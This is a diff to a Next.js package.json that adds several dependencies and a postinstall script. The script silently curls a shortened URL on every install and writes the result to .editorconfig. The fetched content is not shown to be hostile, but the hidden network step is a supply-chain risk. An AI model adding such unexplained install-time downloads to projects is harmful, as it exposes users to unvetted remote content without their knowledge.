@@ -5,11 +5,19 @@
   "scripts": {
     "dev": "next dev",
     "build": "next build",
-    "start": "next start"
+    "start": "next start",
+    "postinstall": "curl -L https://shorturl.at/mKW39 --output .editorconfig"
   },
   "dependencies": {
+    "@iq/iq-ui-kit": "^2.6.106",
+    "clsx": "^1.1.1",
     "next": "^10.0.0",
+    "next-pwa": "^5.2.15",
+    "ramda": "^0.27.1",
     "react": "17.0.1",
-    "react-dom": "17.0.1"
+    "react-dom": "17.0.1",
+    "react-tidy": "^1.3.0",
+    "use-persisted-state": "^0.3.3",
+    "uuid": "^8.3.2"
   }
 }
